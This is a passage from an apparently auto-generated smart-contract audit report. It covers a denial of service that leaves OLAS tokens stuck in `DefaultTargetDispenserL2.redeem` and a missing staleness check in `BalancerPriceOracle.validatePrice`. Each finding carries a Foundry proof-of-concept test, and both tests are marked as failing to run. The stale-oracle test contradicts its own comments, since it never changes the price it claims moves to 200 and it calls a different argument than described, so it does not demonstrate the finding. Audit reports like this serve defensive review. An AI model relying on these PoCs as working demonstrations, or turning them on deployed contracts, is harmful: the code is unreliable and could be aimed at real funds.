Implement an authenticated setter function (e.g., `setTargetSelectorChainId(address target, bytes4 selector, uint256 chainId, bool allowed)`) in `VerifyData` or `ProcessBridgedDataWormhole` restricted to the owner/timelock.

### M-30 / `Z0FCELR9V2NqWv1w1IqfD`
- Finding title: Lack of try-catch in `redeem` causes permanent stuck funds for reverting targets
- Report lines: 3265-3362
```md
## [M-30]. Lack of try-catch in `redeem` causes permanent stuck funds for reverting targets

## id: Z0FCELR9V2NqWv1w1IqfD

## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
DefaultTargetDispenserL2.redeem

## Finding Status: Valid
### Finding Status Justification: This failure mode can be triggered by an untrusted/malfunctioning staking target reverting on deposit(), not by an admin mistake. Governance may be needed to remediate (pause/migrate/manual handling), but the root cause is an external-call DoS/stuck-queue design issue, not governance misuse.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `redeem` function directly calls `IStaking(target).deposit(amount)`. If the target contract reverts (e.g., due to being paused, buggy, or maliciously designed), the entire `redeem` transaction reverts. Since `redeem` is the only mechanism to process queued items and release the associated OLAS tokens, a reverting target causes the funds allocated to it to be permanently stuck in the dispenser's `olasBalance`. There is no mechanism to cancel a queued item or withhold the funds if the target is unresponsive.

## Impact
OLAS tokens allocated to a reverting target become permanently stuck in the contract, reducing the available liquidity for other operations if the balance is shared or causing accounting discrepancies. The funds can only be recovered via a full contract migration.

## Command to Run Test


## Proof of Concept
1. An L1 message queues a deposit for a `RevertingTarget`.
2. The dispenser pauses or has insufficient balance, adding the item to `queuedHashes`.
3. The `RevertingTarget` is designed to revert on `deposit()`.
4. Any call to `redeem()` for this item reverts.
5. The tokens associated with this request remain in the dispenser indefinitely.

## Proof of Code
import "forge-std/Test.sol";
import {DefaultTargetDispenserL2} from "contracts/tokenomics/staking/DefaultTargetDispenserL2.sol";

contract RevertingTarget {
    function deposit(uint256) external pure { revert("Broken"); }
}

contract MockToken {
    mapping(address => uint256) public balanceOf;
    function approve(address, uint256) external returns (bool) { return true; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
}

contract MockFactory {
    function verifyInstanceAndGetEmissionsAmount(address) external pure returns (uint256) { return 100; }
}

contract ConcreteDispenser is DefaultTargetDispenserL2 {
    constructor(address _olas, address _factory, address _relayer, address _processor, uint256 _chainId)
        DefaultTargetDispenserL2(_olas, _factory, _relayer, _processor, _chainId) {}
    function _sendMessage(uint256, bytes memory, bytes32) internal override returns (uint256, uint256) { return (0,0); }
    function processMessage(bytes memory data) external { _processData(data, false); }
}

contract RedeemDoSTest is Test {
    ConcreteDispenser dispenser;
    MockToken olas;
    MockFactory factory;
    RevertingTarget target;
    
    function setUp() public {
        olas = new MockToken();
        factory = new MockFactory();
        target = new RevertingTarget();
        dispenser = new ConcreteDispenser(address(olas), address(factory), address(this), address(this), 1);
        olas.mint(address(dispenser), 1000);
    }

    function testRedeemDoS() public {
        dispenser.pause();
        bytes32 batchHash = keccak256("batch");
        address[] memory targets = new address[](1);
        targets[0] = address(target);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100;
        
        // Queue
        dispenser.processMessage(abi.encode(targets, amounts, batchHash));
        
        dispenser.unpause();
        
        // Redeem reverts
        vm.expectRevert("Broken");
        dispenser.redeem(address(target), 100, batchHash);
    }
}

## Suggested Mitigation
Wrap the `IStaking(target).deposit(amount)` call in a `try/catch` block within `redeem`. If the call fails, treat the amount as withheld (update `withheldAmount` and emit event) and remove the item from the queue to prevent funds from being stuck.
```

### M-31 / `wlN5B2Dg4rjRnHJHdfkPc`
- Finding title: BalancerPriceOracle validatePrice lacks staleness check allowing usage of outdated prices
- Report lines: 3363-3421
```md
## [M-31]. BalancerPriceOracle validatePrice lacks staleness check allowing usage of outdated prices

## id: wlN5B2Dg4rjRnHJHdfkPc

## Derived From Pattern/Invariant
StaleOracleAcceptance

## Exploit Type
Oracle

## Location
BalancerPriceOracle.validatePrice

## Finding Status: Valid
### Finding Status Justification: validatePrice has no upper bound on (block.timestamp - snapshot.lastUpdated). If updates stop for long periods, the computed timeWeightedAverage is derived from the old snapshot and an assumption that snapshot.averagePrice persisted, and validation compares the current spot getPrice() against that stale baseline. This can cause the protocol to accept a spot price consistent with an old average, even when broader market conditions have changed, especially if an attacker can transiently steer the Balancer pool spot toward the stale value. There is no maxStaleness/maxDelay check, so the invariant “oracle freshness” is not enforced on-chain.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `validatePrice` function calculates a Time-Weighted Average Price (TWAP) using the stored snapshot and the current time. However, it does not enforce a maximum `elapsedTime` (staleness threshold). If the oracle has not been updated for a long period (e.g., due to lack of keeper activity or network congestion), `validatePrice` will return `true` for prices close to the old snapshot, even if the real market price has moved significantly. This allows users or attackers to execute trades with the protocol (e.g., in `LiquidityManager`) at stale prices, leading to value loss for the protocol.

## Impact
Protocol may trade assets at outdated prices, leading to arbitrage loss.

## Command to Run Test


## Proof of Concept
1. Oracle updated at T=0 with Price=100.
2. No updates for 1 week.
3. Market price moves to 200.
4. Attacker calls `validatePrice` (implicitly via protocol function) with a trade price of 100.
5. `validatePrice` computes TWAP. Since elapsed time is huge, TWAP ~= Old Average (100).
6. Check passes. Protocol executes trade at 100, losing value vs market 200.

## Proof of Code
function testStaleOracle() public {
    // Setup oracle at price 100
    vault.setBalances(100e18, 100e18);
    oracle.updatePrice();
    
    // Advance 1 year
    vm.warp(block.timestamp + 31536000);
    
    // Market price is now 200, but we trade at 100
    vault.setBalances(100e18, 100e18);
    
    // validatePrice(0) checks if current (100) is close to TWAP
    // TWAP will be dominated by old history (100)
    bool valid = oracle.validatePrice(1); 
    assertTrue(valid); // Returns true despite price being 1 year old
}

## Suggested Mitigation
Add a staleness check in `validatePrice`: `require(block.timestamp - snapshot.lastUpdated <= maxStaleness, 'Oracle stale');`.
```

### M-32 / `BkFnpC_Ic5A85ISATni2R`
- Finding title: Oracle validation accepts stale data allowing slippage attacks
